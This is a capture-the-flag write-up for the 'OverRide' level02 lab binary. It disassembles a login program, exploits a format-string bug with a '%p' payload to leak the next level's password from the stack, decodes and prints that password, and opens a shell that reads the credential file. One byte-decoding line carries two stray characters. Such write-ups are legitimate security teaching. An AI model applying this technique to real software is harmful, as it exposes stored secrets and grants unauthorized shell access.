# OVERRIDE

## level02

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400640  _init
0x0000000000400670  strncmp
0x0000000000400670  strncmp@plt
0x0000000000400680  puts
0x0000000000400680  puts@plt
0x0000000000400690  fread
0x0000000000400690  fread@plt
0x00000000004006a0  fclose
0x00000000004006a0  fclose@plt
0x00000000004006b0  system
0x00000000004006b0  system@plt
0x00000000004006c0  printf
0x00000000004006c0  printf@plt
0x00000000004006d0  strcspn
0x00000000004006d0  strcspn@plt
0x00000000004006e0  __libc_start_main
0x00000000004006e0  __libc_start_main@plt
0x00000000004006f0  fgets
0x00000000004006f0  fgets@plt
0x0000000000400700  fopen
0x0000000000400700  fopen@plt
0x0000000000400710  exit
0x0000000000400710  exit@plt
0x0000000000400720  fwrite
0x0000000000400720  fwrite@plt
0x0000000000400730  _start
0x000000000040075c  call_gmon_start
0x0000000000400780  __do_global_dtors_aux
0x00000000004007f0  frame_dummy
0x0000000000400814  main                # <--------
0x0000000000400ac0  __libc_csu_init
0x0000000000400b50  __libc_csu_fini
0x0000000000400b60  __do_global_ctors_aux
0x0000000000400b98  _fini
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x400814 <+0>:     push   %rbp
   0x400815 <+1>:     mov    %rsp,%rbp
   0x400818 <+4>:     sub    $0x120,%rsp
   0x40081f <+11>:    mov    %edi,-0x114(%rbp)           # argc
   0x400825 <+17>:    mov    %rsi,-0x120(%rbp)           # argv
                                                        # -0x70(%rbp)  username[100]
                                                        # -0xa0(%rbp)  file_pass[41]
                                                        # -0x110(%rbp) password[100]
                                                        # -0x8(%rbp)   FILE *fp
                                                        # -0xc(%rbp)   int nread
   0x40082c <+24>:    lea    -0x70(%rbp),%rdx
   0x400830 <+28>:    mov    $0x0,%eax
   0x400835 <+33>:    mov    $0xc,%ecx                   # 12 * 8 = 96
   0x40083a <+38>:    mov    %rdx,%rdi
   0x40083d <+41>:    rep stos %rax,%es:(%rdi)
   0x400840 <+44>:    mov    %rdi,%rdx
   0x400843 <+47>:    mov    %eax,(%rdx)
   0x400845 <+49>:    add    $0x4,%rdx                   # memset(username, 0, 100)
   0x400849 <+53>:    lea    -0xa0(%rbp),%rdx
   0x400850 <+60>:    mov    $0x0,%eax
   0x400855 <+65>:    mov    $0x5,%ecx                   # 5 * 8 = 40
   0x40085a <+70>:    mov    %rdx,%rdi
   0x40085d <+73>:    rep stos %rax,%es:(%rdi)
   0x400860 <+76>:    mov    %rdi,%rdx
   0x400863 <+79>:    mov    %al,(%rdx)
   0x400865 <+81>:    add    $0x1,%rdx                   # memset(file_pass, 0, 41)
   0x400869 <+85>:    lea    -0x110(%rbp),%rdx
   0x400870 <+92>:    mov    $0x0,%eax
   0x400875 <+97>:    mov    $0xc,%ecx
   0x40087a <+102>:   mov    %rdx,%rdi
   0x40087d <+105>:   rep stos %rax,%es:(%rdi)
   0x400880 <+108>:   mov    %rdi,%rdx
   0x400883 <+111>:   mov    %eax,(%rdx)
   0x400885 <+113>:   add    $0x4,%rdx                   # memset(password, 0, 100)
   0x400889 <+117>:   movq   $0x0,-0x8(%rbp)             # fp = NULL
   0x400891 <+125>:   movl   $0x0,-0xc(%rbp)             # nread = 0
   0x400898 <+132>:   mov    $0x400bb0,%edx              # "r"
   0x40089d <+137>:   mov    $0x400bb2,%eax              # "/home/users/level03/.pass"
   0x4008a2 <+142>:   mov    %rdx,%rsi
   0x4008a5 <+145>:   mov    %rax,%rdi
   0x4008a8 <+148>:   callq  0x400700 <fopen@plt>        # fopen("/home/users/level03/.pass", "r")
   0x4008ad <+153>:   mov    %rax,-0x8(%rbp)
   0x4008b1 <+157>:   cmpq   $0x0,-0x8(%rbp)
   0x4008b6 <+162>:   jne    0x4008e6 <main+210>
   0x4008b8 <+164>:   mov    0x200991(%rip),%rax         # stderr
   0x4008bf <+171>:   mov    %rax,%rdx
   0x4008c2 <+174>:   mov    $0x400bd0,%eax              # "ERROR: failed to open password file\n"
   0x4008c7 <+179>:   mov    %rdx,%rcx
   0x4008ca <+182>:   mov    $0x24,%edx                  # 36
   0x4008cf <+187>:   mov    $0x1,%esi
   0x4008d4 <+192>:   mov    %rax,%rdi
   0x4008d7 <+195>:   callq  0x400720 <fwrite@plt>
   0x4008dc <+200>:   mov    $0x1,%edi
   0x4008e1 <+205>:   callq  0x400710 <exit@plt>
   0x4008e6 <+210>:   lea    -0xa0(%rbp),%rax            # file_pass
   0x4008ed <+217>:   mov    -0x8(%rbp),%rdx
   0x4008f1 <+221>:   mov    %rdx,%rcx
   0x4008f4 <+224>:   mov    $0x29,%edx                  # 41
   0x4008f9 <+229>:   mov    $0x1,%esi
   0x4008fe <+234>:   mov    %rax,%rdi
   0x400901 <+237>:   callq  0x400690 <fread@plt>        # fread(file_pass, 1, 41, fp)
   0x400906 <+242>:   mov    %eax,-0xc(%rbp)
   0x400909 <+245>:   lea    -0xa0(%rbp),%rax
   0x400910 <+252>:   mov    $0x400bf5,%esi              # "\n"
   0x400915 <+257>:   mov    %rax,%rdi
   0x400918 <+260>:   callq  0x4006d0 <strcspn@plt>
   0x40091d <+265>:   movb   $0x0,-0xa0(%rbp,%rax,1)     # file_pass[strcspn(file_pass, "\n")] = 0
   0x400925 <+273>:   cmpl   $0x29,-0xc(%rbp)
   0x400929 <+277>:   je     0x40097d <main+361>         # need exactly 41 bytes
   0x40092b <+279>:   mov    0x20091e(%rip),%rax         # stderr
   0x400932 <+286>:   mov    %rax,%rdx
   0x400935 <+289>:   mov    $0x400bf8,%eax              # "ERROR: failed to read password file\n"
   0x40093a <+294>:   mov    %rdx,%rcx
   0x40093d <+297>:   mov    $0x24,%edx
   0x400942 <+302>:   mov    $0x1,%esi
   0x400947 <+307>:   mov    %rax,%rdi
   0x40094a <+310>:   callq  0x400720 <fwrite@plt>
   0x40094f <+315>:   mov    0x2008fa(%rip),%rax
   0x400956 <+322>:   mov    %rax,%rdx
   0x400959 <+325>:   mov    $0x400bf8,%eax              # same error again
   0x40095e <+330>:   mov    %rdx,%rcx
   0x400961 <+333>:   mov    $0x24,%edx
   0x400966 <+338>:   mov    $0x1,%esi
   0x40096b <+343>:   mov    %rax,%rdi
   0x40096e <+346>:   callq  0x400720 <fwrite@plt>
   0x400973 <+351>:   mov    $0x1,%edi
   0x400978 <+356>:   callq  0x400710 <exit@plt>
   0x40097d <+361>:   mov    -0x8(%rbp),%rax
   0x400981 <+365>:   mov    %rax,%rdi
   0x400984 <+368>:   callq  0x4006a0 <fclose@plt>
   0x400989 <+373>:   mov    $0x400c20,%edi
   0x40098e <+378>:   callq  0x400680 <puts@plt>         # "===== [ Secure Access System v1.0 ] ====="
   0x400993 <+383>:   mov    $0x400c50,%edi
   0x400998 <+388>:   callq  0x400680 <puts@plt>         # "/" + 39 '*' + "\\"
   0x40099d <+393>:   mov    $0x400c80,%edi
   0x4009a2 <+398>:   callq  0x400680 <puts@plt>         # "| You must login to access this system. |"
   0x4009a7 <+403>:   mov    $0x400cb0,%edi
   0x4009ac <+408>:   callq  0x400680 <puts@plt>         # "\\" + 38 '*' + "/"
   0x4009b1 <+413>:   mov    $0x400cd9,%eax
   0x4009b6 <+418>:   mov    %rax,%rdi
   0x4009b9 <+421>:   mov    $0x0,%eax
   0x4009be <+426>:   callq  0x4006c0 <printf@plt>       # "--[ Username: "
   0x4009c3 <+431>:   mov    0x20087e(%rip),%rax         # stdin
   0x4009ca <+438>:   mov    %rax,%rdx
   0x4009cd <+441>:   lea    -0x70(%rbp),%rax
   0x4009d1 <+445>:   mov    $0x64,%esi                  # 100
   0x4009d6 <+450>:   mov    %rax,%rdi
   0x4009d9 <+453>:   callq  0x4006f0 <fgets@plt>        # fgets(username, 100, stdin)
   0x4009de <+458>:   lea    -0x70(%rbp),%rax
   0x4009e2 <+462>:   mov    $0x400bf5,%esi              # "\n"
   0x4009e7 <+467>:   mov    %rax,%rdi
   0x4009ea <+470>:   callq  0x4006d0 <strcspn@plt>
   0x4009ef <+475>:   movb   $0x0,-0x70(%rbp,%rax,1)     # strip newline
   0x4009f4 <+480>:   mov    $0x400ce8,%eax
   0x4009f9 <+485>:   mov    %rax,%rdi
   0x4009fc <+488>:   mov    $0x0,%eax
   0x400a01 <+493>:   callq  0x4006c0 <printf@plt>       # "--[ Password: "
   0x400a06 <+498>:   mov    0x20083b(%rip),%rax         # stdin
   0x400a0d <+505>:   mov    %rax,%rdx
   0x400a10 <+508>:   lea    -0x110(%rbp),%rax
   0x400a17 <+515>:   mov    $0x64,%esi                  # 100
   0x400a1c <+520>:   mov    %rax,%rdi
   0x400a1f <+523>:   callq  0x4006f0 <fgets@plt>        # fgets(password, 100, stdin)
   0x400a24 <+528>:   lea    -0x110(%rbp),%rax
   0x400a2b <+535>:   mov    $0x400bf5,%esi              # "\n"
   0x400a30 <+540>:   mov    %rax,%rdi
   0x400a33 <+543>:   callq  0x4006d0 <strcspn@plt>
   0x400a38 <+548>:   movb   $0x0,-0x110(%rbp,%rax,1)    # strip newline
   0x400a40 <+556>:   mov    $0x400cf8,%edi
   0x400a45 <+561>:   callq  0x400680 <puts@plt>         # 41 '*'
   0x400a4a <+566>:   lea    -0x110(%rbp),%rcx           # password
   0x400a51 <+573>:   lea    -0xa0(%rbp),%rax            # file_pass
   0x400a58 <+580>:   mov    $0x29,%edx                  # 41
   0x400a5d <+585>:   mov    %rcx,%rsi
   0x400a60 <+588>:   mov    %rax,%rdi
   0x400a63 <+591>:   callq  0x400670 <strncmp@plt>      # strncmp(file_pass, password, 41)
   0x400a68 <+596>:   test   %eax,%eax
   0x400a6a <+598>:   jne    0x400a96 <main+642>
   0x400a6c <+600>:   mov    $0x400d22,%eax              # "Greetings, %s!\n"
   0x400a71 <+605>:   lea    -0x70(%rbp),%rdx            # username
   0x400a75 <+609>:   mov    %rdx,%rsi
   0x400a78 <+612>:   mov    %rax,%rdi
   0x400a7b <+615>:   mov    $0x0,%eax
   0x400a80 <+620>:   callq  0x4006c0 <printf@plt>       # printf("Greetings, %s!\n", username)
   0x400a85 <+625>:   mov    $0x400d32,%edi              # "/bin/sh"
   0x400a8a <+630>:   callq  0x4006b0 <system@plt>       # system("/bin/sh")
   0x400a8f <+635>:   mov    $0x0,%eax
   0x400a94 <+640>:   leaveq
   0x400a95 <+641>:   retq
   0x400a96 <+642>:   lea    -0x70(%rbp),%rax            # username
   0x400a9a <+646>:   mov    %rax,%rdi
   0x400a9d <+649>:   mov    $0x0,%eax
   0x400aa2 <+654>:   callq  0x4006c0 <printf@plt>       # printf(username)  ← format string
   0x400aa7 <+659>:   mov    $0x400d3a,%edi
   0x400aac <+664>:   callq  0x400680 <puts@plt>         # " does not have access!"
   0x400ab1 <+669>:   mov    $0x1,%edi
   0x400ab6 <+674>:   callq  0x400710 <exit@plt>
End of assembler dump.
```

64-bit login program. No buffer overflow. The shell is `system("/bin/sh")` after a matching password.
What the program does

Reads 41 bytes from `/home/users/level03/.pass` into a stack buffer file_pass[41].
Asks for username (`fgets`, 100 bytes) and password (`fgets`, 100 bytes).
`strncmp(file_pass, password, 41)`.
Match → `printf("Greetings, %s!\n", username)` then `system("/bin/sh")`.
Miss → `printf(username)` then `puts(" does not have access!")`.

The exploit comes from the miss path, `printf(username)` uses the user input as the format string,
since file_pass is still on the stack, we can use `%p` to dump those bytes to retrieve the password

```sh
level02@OverRide:~$ python -c 'print "AAAA"+"-%p"*30; print "x"' | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAA-0x7fffffffe500-(nil)-0x78-0x2a2a2a2a2a2a2a2a-0x2a2a2a2a2a2a2a2a-0x7fffffffe6f8-0x1f7ff9a08-0x78-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x100000000-(nil)-0x756e505234376848-0x45414a3561733951-0x377a7143574e6758-0x354a35686e475873-0x48336750664b394d-(nil)-0x2d70252d41414141-0x70252d70252d7025-0x252d70252d70252d does not have access!
```

Useful part of the dump:
```sh
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
(nil)
```

Five qwords + NULL = 40 characters + terminator. It matches perfectly the `fread(41)` (40 chars + newline, newline stripped)

`%p` prints a 64-bit stack slot as hex, little-endian. We need to reverse the bytes to get ASCII:
```sh
0x756e505234376848 -> 48 68 37 34 52 50 6e 75 -> Hh74RPnu
0x45414a3561733951 -> 51 39 73 61 35 4a 41 45 -> Q9sa5JAE
0x377a7143574e6758 -> 58 67 4e 57 43 71 7a 37 -> 77XgNWCqz7
0x354a35686e475873 -> 73 58 47 6e 68 35 4a 35 -> sXGnh5J5
0x48336750664b394d -> 4d 39 4b 66 50 67 33 48 -> M9KfPg3H
```

```sh
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

We can verify it by using a wrong username and the good password this time:

```sh
level02@OverRide:~$ (python -c 'print "x\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"'; cat) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
Greetings, x!
whoami
level03
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```